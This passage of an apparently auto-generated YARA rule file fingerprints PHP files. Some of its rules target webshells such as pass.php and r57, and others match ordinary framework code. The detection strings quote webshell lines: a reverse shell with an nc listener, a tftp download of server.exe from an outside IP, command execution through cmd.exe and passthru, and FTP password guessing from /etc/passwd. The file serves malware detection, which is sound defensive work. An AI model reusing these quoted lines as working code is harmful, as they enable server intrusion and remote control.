      $s19 = "3d20273435366237303136613931366134623137386464373262393437633135326237273b0a2466696c65203d20245f504f53545b2766696c65275d3b0a2462" ascii
      $s20 = "697065222c20227222292c0a09090931203d3e206172726179282270697065222c20227722292c0a09090932203d3e206172726179282270697065222c202277" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule PromotionActionInterface
{
   meta:
      description = "php22 - file PromotionActionInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "48da5a28ec4bfe5b34bc5a37e66ab20cff939be15c87a8c57c7e60dae3ec8601"
   strings:
      $s1 = "interface PromotionActionInterface extends ResourceInterface, ConfigurablePromotionElementInterface" fullword ascii
      $s2 = "* @param PromotionInterface|null $promotion" fullword ascii
      $s3 = "* @param string|null $type" fullword ascii
      $s4 = "public function setConfiguration(array $configuration): void;" fullword ascii
      $s5 = "use Sylius\\Component\\Resource\\Model\\ResourceInterface;" fullword ascii
      $s6 = "namespace Sylius\\Component\\Promotion\\Model;" fullword ascii
      $s7 = "public function setPromotion(?PromotionInterface $promotion): void;" fullword ascii
      $s8 = "public function setType(?string $type): void;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule php22_pass
{
   meta:
      description = "php22 - file pass.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "56210f61b94682abb4c7986bbbed4ad4e2dce58a25955c071bc939a80eca7c43"
   strings:
      $x1 = "echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x2 = "$exe = @$shell->exec(\"cmd.exe /c \".$cmd);" fullword ascii
      $x3 = "Str[8] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x4 = "Str[6] = \"tftp -i 219.134.46.245 get server.exe c:\\\\server.exe\";" fullword ascii
      $x5 = "$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';" fullword ascii
      $x6 = "if(md5($_POST['spiderpass']) == md5($password)){die('<meta http-equiv=\"refresh\" content=\"1;URL=?\">');}" fullword ascii
      $x7 = "<input type=\"text\" name=\"tcb\" id=\"tcb\" value=\"http://www.baidu.com/download/muma.exe\" style=\"width:500px;\">';" fullword ascii
      $x8 = "if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}" fullword ascii
      $x9 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x10 = "$query = \"INSERT into Spider_Temp_Tab values (CONVERT(\".$shellcode.\",CHAR));\";" fullword ascii
      $x11 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x12 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x13 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x14 = "elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x15 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $x16 = ": &lt;script language=javascript src=\"http://www.baidu.com/ad.js?EMTDSU\"&gt;&lt;/script&gt;</div></div>" fullword ascii
      $x17 = "<div class=\"topbg\"> &nbsp; {$Server_IP} - {$Server_OS} - <a href=\"{$Server_Alexa}\" target=\"_blank\">Alexa</a></div>" fullword ascii
      $x18 = "$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';" fullword ascii
      $x19 = "$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\\windows\\php.ini c:\\php.ini';" fullword ascii
      $x20 = "if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*)
}

rule php22_Quality
{
   meta:
      description = "php22 - file Quality.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "111decd930f3e5c67038a9a1e90f2ebd5b115f878bce7552fa70a6d852757ca5"
   strings:
      $s1 = "* @param  \\Intervention\\Image\\Image $image" fullword ascii
      $s2 = "* @return \\Intervention\\Image\\Image" fullword ascii
      $s3 = "* Handle the image manipulation request" fullword ascii
      $s4 = "* @param  array                     $options" fullword ascii
      $s5 = "namespace Modules\\Media\\Image\\Intervention\\Manipulations;" fullword ascii
      $s6 = "use Modules\\Media\\Image\\ImageHandlerInterface;" fullword ascii
      $s7 = "public function handle($image, $options)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule RegisterShippingMethodsResolversPass
{
   meta:
      description = "php22 - file RegisterShippingMethodsResolversPass.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d5befa46be386babdeb10875daf6cbfd50b2d8da24b9de14014dd0db9460c6ff"
   strings:
      $s1 = "use Symfony\\Component\\DependencyInjection\\Compiler\\CompilerPassInterface;" fullword ascii
      $s2 = "namespace Sylius\\Bundle\\ShippingBundle\\DependencyInjection\\Compiler;" fullword ascii
      $s3 = "use Symfony\\Component\\DependencyInjection\\Reference;" fullword ascii
      $s4 = "public function process(ContainerBuilder $container): void" fullword ascii
      $s5 = "throw new \\InvalidArgumentException('Tagged shipping methods resolvers need to have `type` and `label` attributes.');" fullword ascii
      $s6 = "throw new \\InvalidArgumentException('Tagged shipping methods resolvers need to have `type` and `label` attribute" fullword ascii
      $s7 = "foreach ($container->findTaggedServiceIds('sylius.shipping_method_resolver') as $id => $attributes) {" fullword ascii
      $s8 = "final class RegisterShippingMethodsResolversPass implements CompilerPassInterface" fullword ascii
      $s9 = "$registry = $container->findDefinition('sylius.registry.shipping_methods_resolver');" fullword ascii
      $s10 = "$container->setParameter('sylius.shipping_method_resolvers', $resolvers);" fullword ascii
      $s11 = "if (!isset($attributes[0]['type']) || !isset($attributes[0]['label'])) {" fullword ascii
      $s12 = "if (!$container->hasDefinition('sylius.registry.shipping_methods_resolver')) {" fullword ascii
      $s13 = "$resolvers[$attributes[0]['type']] = $attributes[0]['label'];" fullword ascii
      $s14 = "$priority = (int) ($attributes[0]['priority'] ?? 0);" fullword ascii
      $s15 = "$registry->addMethodCall('register', [new Reference($id), $priority]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule RemoteWithEnvironmentXmlCept
{
   meta:
      description = "php22 - file RemoteWithEnvironmentXmlCept.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a3c63327b5ae6fb59fc8a3f8608273aacc03dcfa9cd1d4f91f5d3a071bece0a8"
   strings:
      $x1 = "$I->executeCommand('run remote --coverage-xml --env default');" fullword ascii
      $s2 = "$I->seeInShellOutput('Code Coverage Report');" fullword ascii
      $s3 = "$I->dontSeeInShellOutput('RemoteException');" fullword ascii
      $s4 = "$I->wantTo('try generate codecoverage xml report with environment');" fullword ascii
      $s5 = "$I->seeCoverageStatsNotEmpty();" fullword ascii
      $s6 = "$I->seeFileFound('coverage.xml', 'tests/_output');" fullword ascii
      $s7 = "$I = new CoverGuy($scenario);" fullword ascii
      $s8 = "$I->amInPath('tests/data/sandbox');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule OrderLocaleAssigner
{
   meta:
      description = "php22 - file OrderLocaleAssigner.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "858d7158c9e2b74210404e207c36cdee9ee3678c9294d5f2a156f28c0bcc57fa"
   strings:
      $s1 = "* @param ResourceControllerEvent $event" fullword ascii
      $s2 = "* @param LocaleContextInterface $localeContext" fullword ascii
      $s3 = "$order->setLocaleCode($this->localeContext->getLocaleCode());" fullword ascii
      $s4 = "* @var LocaleContextInterface" fullword ascii
      $s5 = "namespace Sylius\\Bundle\\ShopBundle\\EventListener;" fullword ascii
      $s6 = "use Sylius\\Component\\Locale\\Context\\LocaleContextInterface;" fullword ascii
      $s7 = "$order = $event->getSubject();" fullword ascii
      $s8 = "use Sylius\\Bundle\\ResourceBundle\\Event\\ResourceControllerEvent;" fullword ascii
      $s9 = "/** @var OrderInterface $order */" fullword ascii
      $s10 = "public function __construct(LocaleContextInterface $localeContext)" fullword ascii
      $s11 = "public function assignLocale(ResourceControllerEvent $event): void" fullword ascii
      $s12 = "private $localeContext;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule php22_Oci
{
   meta:
      description = "php22 - file Oci.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "456f7d456ce0fc23ab5ee3aca528b83ceb7178286b75c87a10fe903ec09c26b6"
   strings:
      $x1 = "* SQL commands should ends with `//` in the dump file" fullword ascii
      $s2 = "EXECUTE IMMEDIATE('DROP TRIGGER ' || user || '.\\\"' || i.trigger_name || '\\\"');" fullword ascii
      $s3 = "EXECUTE IMMEDIATE('DROP SEQUENCE ' || user || '.\\\"' || i.sequence_name || '\\\"');" fullword ascii
      $s4 = "EXECUTE IMMEDIATE('DROP VIEW ' || user || '.\\\"' || i.view_name || '\\\"');" fullword ascii
      $s5 = "EXECUTE IMMEDIATE('DROP TABLE ' || user || '.\\\"' || i.table_name || '\\\" CASCADE CONSTRAINTS');" fullword ascii
      $s6 = "if (substr($query, -1 * $delimiterLength, $delimiterLength) == $delimiter) {" fullword ascii
      $s7 = "$stmt = $this->executeQuery($query, [$tableName]);" fullword ascii
      $s8 = "$this->sqlQuery(substr($query, 0, -1 * $delimiterLength));" fullword ascii
      $s9 = "public function getPrimaryKey($tableName)" fullword ascii
      $s10 = "* IF you want to load triggers too." fullword ascii
      $s11 = "* but in this case you need to change the $delimiter from `//` to `;`" fullword ascii
      $s12 = "* IF you do not want to load triggers you can use the `;` characters" fullword ascii
      $s13 = "$this->dbh->exec(" fullword ascii
      $s14 = "* @return array[string]" fullword ascii
      $s15 = "if (preg_match('/DELIMITER ([\\;\\$\\|\\\\\\\\]+)/i', $sqlLine, $match)) {" fullword ascii
      $s16 = "namespace Codeception\\Lib\\Driver;" fullword ascii
      $s17 = "FOR i IN (SELECT trigger_name FROM user_triggers)" fullword ascii
      $s18 = "FOR i IN (SELECT sequence_name FROM user_sequences)" fullword ascii
      $s19 = "$this->primaryKeys[$tableName] = $primaryKey;" fullword ascii
      $s20 = "if (!isset($this->primaryKeys[$tableName])) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule PageTypeConfiguration
{
   meta:
      description = "php22 - file PageTypeConfiguration.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "53954d57f6818e666b6a696ce9a00e096851a18029b25d84980b0b24a9397caf"
   strings:
      $s1 = "$ids = $db->GetCol('select cID from Pages where ptID = ? and cIsTemplate = 0 and cIsActive = 1', [$this->getPageTypeID()]);" fullword ascii
      $s2 = "$ids = $db->GetCol('select cID from Pages where ptID = ? and cIsTemplate = 0 and cIsActive = 1', [$this->getPageTypeID()" fullword ascii
      $s3 = "namespace Concrete\\Core\\Page\\Type\\PublishTarget\\Configuration;" fullword ascii
      $s4 = "$target->addAttribute('form-factor', $this->getSelectorFormFactor());" fullword ascii
      $s5 = "$target = parent::export($cxml);" fullword ascii
      $s6 = "$target->addAttribute('pagetype', $ct->getPageTypeHandle());" fullword ascii
      $s7 = "$target->addAttribute('path', $c->getCollectionPath());" fullword ascii
      $s8 = "public function canPublishPageTypeBeneathTarget(Type $pagetype, Page $page)" fullword ascii
      $s9 = "$c = Page::getByID($this->getStartingPointPageID(), 'ACTIVE');" fullword ascii
      $s10 = "return $page->getPageTypeID() == $this->getPageTypeID();" fullword ascii
      $s11 = "class PageTypeConfiguration extends Configuration" fullword ascii
      $s12 = "* @param mixed $startingPointPage" fullword ascii
      $s13 = "public function getStartingPointPageID()" fullword ascii
      $s14 = "public function getDefaultParentPageID()" fullword ascii
      $s15 = "$ct = PageType::getByID($this->ptID);" fullword ascii
      $s16 = "public function setPageTypeID($ptID)" fullword ascii
      $s17 = "public function getSelectorFormFactor()" fullword ascii
      $s18 = "if ($this->getStartingPointPageID()) {" fullword ascii
      $s19 = "public function getPageTypeID()" fullword ascii
      $s20 = "public function setSelectorFormFactor($selectorFormFactor)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule OrderItemUnitFactorySpec
{
   meta:
      description = "php22 - file OrderItemUnitFactorySpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b98c547b8747f1f589a228df06ef806be6636cf8791a9c7f6f62c591547f98df"
   strings:
      $s1 = "return $subject->getOrderItem() === $key->getOrderItem();" fullword ascii
      $s2 = "if (!$subject instanceof OrderItemUnitInterface || !$key instanceof OrderItemUnitInterface) {" fullword ascii
      $s3 = "use Sylius\\Component\\Resource\\Exception\\UnsupportedMethodException;" fullword ascii
      $s4 = "$orderItemUnit->getOrderItem()->willReturn($orderItem);" fullword ascii
      $s5 = "function it_throws_an_exception_while_trying_create_order_item_unit_without_order_item(): void" fullword ascii
      $s6 = "use Sylius\\Component\\Order\\Factory\\OrderItemUnitFactoryInterface;" fullword ascii
      $s7 = "use Sylius\\Component\\Order\\Model\\OrderItemInterface;" fullword ascii
      $s8 = "use Sylius\\Component\\Order\\Model\\OrderItemUnitInterface;" fullword ascii
      $s9 = "namespace spec\\Sylius\\Component\\Order\\Factory;" fullword ascii
      $s10 = "public function getMatchers(): array" fullword ascii
      $s11 = "use Sylius\\Component\\Order\\Model\\OrderItemUnit;" fullword ascii
      $s12 = "$this->shouldThrow(UnsupportedMethodException::class)->during('createNew');" fullword ascii
      $s13 = "$this->createForItem($orderItem)->shouldBeSameAs($orderItemUnit);" fullword ascii
      $s14 = "'beSameAs' => function ($subject, $key) {" fullword ascii
      $s15 = "function it_creates_a_new_order_item_unit_with_given_order_item(" fullword ascii
      $s16 = "function it_implements_a_factory_interface(): void" fullword ascii
      $s17 = "OrderItemUnitInterface $orderItemUnit" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule objectiterateable
{
   meta:
      description = "php22 - file objectiterateable.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "919552bc18fb6e30a6a47c1c52280a0fbd56add305b5b7a6ca1c9109b9f0cf52"
   strings:
      $s1 = "|| stripos( get_class( $variable ), 'zend' ) !== false // zf2 PDO wrapper does not play nice" fullword ascii
      $s2 = "$this->type  = 'Iterator contents';" fullword ascii
      $s3 = "$this->value = kintParser::factory( $arrayCopy )->extendedValue;" fullword ascii
      $s4 = "$arrayCopy = iterator_to_array( $variable, true );" fullword ascii
      $s5 = "protected function _parse( & $variable )" fullword ascii
      $s6 = "if ( $arrayCopy === false ) return false;" fullword ascii
      $s7 = "$this->size  = count( $arrayCopy );" fullword ascii
      $s8 = "|| !$variable instanceof Traversable" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ProductListingSort
{
   meta:
      description = "php22 - file ProductListingSort.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c727e0c96e6b5c5e086661cc36e692a2423b149747b50aef448b48caa51fbefe"
   strings:
      $s1 = "\\devgroup\\TagDependencyHelper\\ActiveRecordHelper::getCommonTag(static::className())" fullword ascii
      $s2 = "* Returns all enabled sorts as array of rows" fullword ascii
      $s3 = "* This is the model class for table \"{{%product_listing_sort}}\"." fullword ascii
      $s4 = "* @property string $sort_field" fullword ascii
      $s5 = "* @property string $asc_desc" fullword ascii
      $s6 = "static::$_cachedRows = Yii::$app->cache->get($cacheKey);" fullword ascii
      $s7 = "* @property integer $sort_order" fullword ascii
      $s8 = "* @property integer $enabled" fullword ascii
      $s9 = "* @property integer $id" fullword ascii
      $s10 = "* Caches through cache and static variable" fullword ascii
      $s11 = "* @inheritdoc" fullword ascii
      $s12 = "[['name', 'sort_field'], 'string', 'max' => 255]" fullword ascii
      $s13 = "$cacheKey = \"ProductListingSorts:all:arrayOfRows\";" fullword ascii
      $s14 = "'asc_desc' => Yii::t('app', 'Asc Desc')," fullword ascii
      $s15 = "['asc_desc', 'default', 'value'=>'asc',]," fullword ascii
      $s16 = "'sort_field' => Yii::t('app', 'Sort Field')," fullword ascii
      $s17 = "'sort_order' => Yii::t('app', 'Sort Order')," fullword ascii
      $s18 = "return '{{%product_listing_sort}}';" fullword ascii
      $s19 = "public function attributeLabels()" fullword ascii
      $s20 = "namespace app\\modules\\shop\\models;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule php22_php
{
   meta:
      description = "php22 - file php.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dad6bd0de329955ef56dd8f275c1b0821253e5b5bc781c2d8dfc169df5f076e4"
   strings:
      $s1 = "$myurl='http://www.zjjv.com';//" fullword ascii
      $s2 = "3Ve+sKNHLuFtP/zpe//hhf/5u78oz+WUKhZyE3elrl4bY70xuT" fullword ascii
      $s3 = "QaOkHSwetBfjpSHLfdrSwGrITkAl4NeAYWB5ANEYeQOMCsMK1Q" fullword ascii
      $s4 = "RvL60vXjRv6pjwLzGPfe/LbsOcvl3fbNi92bSxv5Ztg8dLl5Kd" fullword ascii
      $s5 = "OpqdXVfCBZfjRPdni1iYFZOX/xBHlogZFnrjYJyhpjWvrkoKnc" fullword ascii
      $s6 = "4FMGIYk6p4Vbyu9+wAfTPpb+dfaQ79Hvwe/g4aPaCO/oj4mLL5" fullword ascii
      $s7 = "wIui+t/gBcsvHkJCFZcEQxxlRSugfVjXA/hIzkRjFRLogykm2S" fullword ascii
      $s8 = "oMM5VHOcvAi+ndbMaMqmfGEtsEXIgT7lrzsB1w4jQFfUHzZ65A" fullword ascii
      $s9 = "4NCJOhINHlxJp8Md5iWwGZPCYDlgGBuUJN6bDNhnsADlLve8Iq" fullword ascii
      $s10 = "0A5kXzBtazYaHXtkUgEtigSd1KbR00grmOksD1vRTL2g8sw3d8" fullword ascii
      $s11 = "V8wjiGcpu0JkBzps8H80MZDk8U5lkLdsx9JghqWvdjusPyJAi6" fullword ascii
      $s12 = "bu2JKD2QLRAR9aHrN30RGaGTNih34JBlPDAfVnLlOGMXA3tpNU" fullword ascii
      $s13 = "$password='nihaoa';//" fullword ascii
      $s14 = "kEyQQIaCKTh4GfBa17bQLDFdpkPLcTDT0NsxeKGThRnWpUkmCU" fullword ascii
      $s15 = "rFEOVkarrI8w8POkqzzMtMpu/0LXZS9EruVfJMFKqj+I7GmGsG" fullword ascii
      $s16 = "bbpc4BGEWQrRBgnk+FEauyH0b1nvnoF1b+tport2aIApeA4++U" fullword ascii
      $s17 = "4CsAJ+jcHSQq4Wg2kpbfC2kEyXjgyQai5TMmLIxcNPgno8oHBb" fullword ascii
      $s18 = "B0FbaFtmPmmgZ3s0NQE9OPmTxojoHgUMvoygzi4dEg3KTPdObA" fullword ascii
      $s19 = "ravd5p89RCOmDLWa/acU1OBrRcXXK9oliP/pUsON3cWVWOPNKD" fullword ascii
      $s20 = "ndRUNyt2jJZynKtQxKCd2umkg5Eoj5ct3jk/rbQx4mt+j5omVf" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule ProductOptionApiTest
{
   meta:
      description = "php22 - file ProductOptionApiTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dd22cc04fa3adf05d2e5509e90e05f3d4c092260cd05055fe58f3c785f827225"
   strings:
      $s1 = "$this->client->request('PUT', $this->getProductOptionUrl($productOption), [], [], static::$authorizedHeaderWithContentTy" fullword ascii
      $s2 = "$this->client->request('PATCH', $this->getProductOptionUrl($productOption), [], [], static::$authorizedHeaderWithContent" fullword ascii
      $s3 = "$this->client->request('POST', '/api/v1/product-options/', [], [], static::$authorizedHeaderWithContentType, $data);" fullword ascii
      $s4 = "$this->client->request('POST', '/api/v1/product-options/', [], [], static::$authorizedHeaderWithContentType, []);" fullword ascii
      $s5 = "$this->client->request('DELETE', $this->getProductOptionUrl($productOption), [], [], static::$authorizedHeaderWithConten" fullword ascii
      $s6 = "$this->client->request('GET', $this->getProductOptionUrl($productOption), [], [], static::$authorizedHeaderWithAccept);" fullword ascii
      $s7 = "private static $authorizedHeaderWithContentType = [" fullword ascii
      $s8 = "$this->client->request('GET', '/api/v1/product-options/-1', [], [], static::$authorizedHeaderWithAccept);" fullword ascii
      $s9 = "$this->client->request('DELETE', '/api/v1/product-options/-1', [], [], static::$authorizedHeaderWithAccept);" fullword ascii
      $s10 = "'HTTP_Authorization' => 'Bearer SampleTokenNjZkNjY2MDEwMTAzMDkxMGE0OTlhYzU3NzYyMTE0ZGQ3ODcyMDAwM2EwMDZjNDI5NDlhMDdlMQ'," fullword ascii
      $s11 = "$this->client->request('GET', '/api/v1/product-options/', [], [], static::$authorizedHeaderWithAccept);" fullword ascii
      $s12 = "private function getProductOptionUrl(ProductOptionInterface $productOption)" fullword ascii
      $s13 = "$this->assertResponseCode($response, Response::HTTP_NO_CONTENT);" fullword ascii
      $s14 = "private static $authorizedHeaderWithAccept = [" fullword ascii
      $s15 = "$this->assertResponse($response, 'product_option/show_response_after_partial_update', Response::HTTP_OK);" fullword ascii
      $s16 = "$this->assertResponse($response, 'product_option/create_validation_fail_response', Response::HTTP_BAD_REQUEST);" fullword ascii
      $s17 = "$this->assertResponse($response, 'product_option/show_response_after_update', Response::HTTP_OK);" fullword ascii
      $s18 = "$this->assertResponse($response, 'product_option/index_response_after_delete', Response::HTTP_OK);" fullword ascii
      $s19 = "$this->assertResponse($response, 'product_option/create_response', Response::HTTP_CREATED);" fullword ascii
      $s20 = "$this->assertResponse($response, 'authentication/access_denied_response', Response::HTTP_UNAUTHORIZED);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule otl_dump
{
   meta:
      description = "php22 - file otl_dump.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4c50c027fa7d3c16a215dd56eaf9c8569ce69db9e7f72f1ebae91230da67da70"
   strings:
      $x1 = "// Process Whole LookupList - Get LuCoverage = Lookup coverage just for first glyph" fullword ascii
      $x2 = "die(\"ERROR - You must define the TTCfontID for a TrueType Collection in config_fonts.php (\". $file.\")\");" fullword ascii
      $x3 = "// for Input - set on secondary Lookup table if in Context, and set Backtrack and Lookahead on Context Lookup" fullword ascii
      $x4 = "$Lookup[$i]['Subtable'][$c]['CoverageLookahead'][] = $Lookup[$i]['Subtable'][$c]['Offset'] + $this->read_ushort();" fullword ascii
      $x5 = "$Lookup[$i]['Subtable'][$c]['CoverageTableOffset'] = $Lookup[$i]['Subtable'][$c]['Offset'] + $this->read_ushort();" fullword ascii
      $x6 = "See Example 3 - http://www.microsoft.com/typography/otspec/gdef.htm" fullword ascii
      $s7 = "$html .= '<div><a href=\"font_dump_OTL.php?script='.$st.'&lang='.$l.'\">'.$l.'</a></b>: '; " fullword ascii
      $s8 = "$Lookup[$i]['Subtable'][$c]['AlternateSets'][$s]['Offset'] = $Lookup[$i]['Subtable'][$c]['Offset'] + $this->read_short();" fullword ascii
      $s9 = "$Lookup[$i]['Subtable'][$c]['LookaheadClassDefOffset'] = $Lookup[$i]['Subtable'][$c]['Offset'] + $this->read_ushort();" fullword ascii
      $s10 = "die(\"Lookup Type 5, SubstFormat 3 not tested. Please report this with the name of font used - \".$this->fontkey); " fullword ascii
      $s11 = "$Lookup[$i]['Subtable'][$c]['Sequences'][$s]['Offset'] = $Lookup[$i]['Subtable'][$c]['Offset'] + $this->read_short();" fullword ascii
      $s12 = "$Lookup[$i]['Subtable'][$c]['LigSet'][$s]['Offset'] = $Lookup[$i]['Subtable'][$c]['Offset'] + $this->read_short();" fullword ascii
      $s13 = "$Lookup[$i]['Subtable'][$c]['ChainSubRuleSetOffset'][] = $Lookup[$i]['Subtable'][$c]['Offset'] + $this->read_ushort();" fullword ascii
      $s14 = "$Lookup[$i]['Subtable'][$c]['CoverageBacktrack'][] = $Lookup[$i]['Subtable'][$c]['Offset'] + $this->read_ushort();" fullword ascii
      $s15 = "$Lookup[$i]['Subtable'][$c]['SubRuleSet'][$s]['Offset'] = $Lookup[$i]['Subtable'][$c]['Offset'] + $this->read_short();" fullword ascii
      $s16 = "$html .= $this->_getGSUBarray($Lookup, $lul2, $scripttag, 2, $inputGlyphs[$seqIndex], $exB, $exL);" fullword ascii
      $s17 = "$html .= $this->_getGPOSarray($Lookup, $lul2, $scripttag, 2, $inputGlyphs[$seqIndex], $exB, $exL);" fullword ascii
      $s18 = "$Lookup[$i]['Subtable'][$c]['CoverageInput'][] = $Lookup[$i]['Subtable'][$c]['Offset'] + $this->read_ushort();" fullword ascii
      $s19 = "die(\"ERROR - Error parsing TrueType Collection: version=\".$version.\" - \" . $file);" fullword ascii
      $s20 = "$html .= '<div>GPOS Lookup Type 8: Format 2 not yet supported in OTL dump</div>';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule ResetPasswordPage
{
   meta:
      description = "php22 - file ResetPasswordPage.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6965cdd00c34a5a02e9d63fb2ba3cd3fef20781e76ab524bc049c7cdfc995776"
   strings:
      $s1 = "throw new ElementNotFoundException($this->getSession(), 'Validation message', 'css', '.sylius-validation-error');" fullword ascii
      $s2 = "$errorLabel = $this->getElement($element)->getParent()->find('css', '.sylius-validation-error');" fullword ascii
      $s3 = "class ResetPasswordPage extends SymfonyPage implements ResetPasswordPageInterface" fullword ascii
      $s4 = "return 'sylius_shop_request_password_reset_token';" fullword ascii
      $s5 = "'email' => '#sylius_user_request_password_reset_email'," fullword ascii
      $s6 = "return $message === $errorLabel->getText();" fullword ascii
      $s7 = "* @throws ElementNotFoundException" fullword ascii
      $s8 = "$this->getDocument()->fillField('Email', $email);" fullword ascii
      $s9 = "return array_merge(parent::getDefinedElements(), [" fullword ascii
      $s10 = "$this->getDocument()->pressButton('Reset');" fullword ascii
      $s11 = "protected function getDefinedElements()" fullword ascii
      $s12 = "namespace Sylius\\Behat\\Page\\Shop\\Account;" fullword ascii
      $s13 = "public function getRouteName()" fullword ascii
      $s14 = "public function checkValidationMessageFor($element, $message)" fullword ascii
      $s15 = "if (null === $errorLabel) {" fullword ascii
      $s16 = "use Behat\\Mink\\Exception\\ElementNotFoundException;" fullword ascii
      $s17 = "public function specifyEmail($email)" fullword ascii
      $s18 = "use Sylius\\Behat\\Page\\SymfonyPage;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}


rule PaymentProcessor
{
   meta:
      description = "php22 - file PaymentProcessor.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d6479792e548dd278574a6ddd09e594319efff0c50f35ca3c85c7511e7308ce4"
   strings:
      $s1 = "* @param PaymentRequest $req Request object to be processed" fullword ascii
      $s2 = "* @param RefundRequest $req  object to be processed" fullword ascii
      $s3 = "* PaymentProcessor is an abstract base class for processing PaymentRequest" fullword ascii
      $s4 = "* object to be processed by any class that extends PaymentProcessor" fullword ascii
      $s5 = "* Process a PaymentRequest" fullword ascii
      $s6 = "final function __construct($testmode = false, $username = \"\", $password = \"\", $signature = \"\")" fullword ascii
      $s7 = "* @param array $data array of arguments for post request" fullword ascii
      $s8 = "* @param bool $use_cookies whether to store a cookie file. default = false" fullword ascii
      $s9 = "* objects.  The purpose of this API is to allow a common PaymentRequest" fullword ascii
      $s10 = "protected function CurlPost ($url, $data, $verify_cert = false, $use_cookies = false)" fullword ascii
      $s11 = "* @param string $url url to post" fullword ascii
      $s12 = "* @param bool $verify_cert whether to verify an SSL cert. default = false" fullword ascii
      $s13 = "* @license    http://www.gnu.org/licenses/lgpl.html  LGPL" fullword ascii
      $s14 = "abstract function Process(PaymentRequest $req);" fullword ascii
      $s15 = "// $header[] = \"Accept: text/vnd.wap.wml,*.*\";" fullword ascii
      $s16 = "* Given a 2-digit year, return the full 4-digit year" fullword ascii
      $s17 = "$post_data .= $delim . $key .\"=\" . $data[$key];" fullword ascii
      $s18 = "* @copyright  1997-2012 VerySimple, Inc." fullword ascii
      $s19 = "$tmp = curl_exec ($ch);" fullword ascii
      $s20 = "* @param bool $testmode default = false" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 9KB and
      8 of them
}

rule r57__15_
{
   meta:
      description = "php22 - file r57 (15).php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ffca7aeeab1e56ff8010a15f1511e8bcea90cfdcc84248e18d53dacde04cf08b"
   strings:
      $x1 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - suc" ascii
      $x2 = "'eng_text99'=>'* use username from /etc/passwd for ftp login and password'," fullword ascii
      $x3 = "$sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s4 = "$text['eng'] = array('Connect to ftp server failed','Login to ftp server failed','Can\\'t change dir on ftp server');" fullword ascii
      $s5 = "/*  r57shell.php - ?????? ?? ??? ??????????? ??? ????????? ???? ???????  ?? ??????? ????? ???????" fullword ascii
      $s6 = "else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii
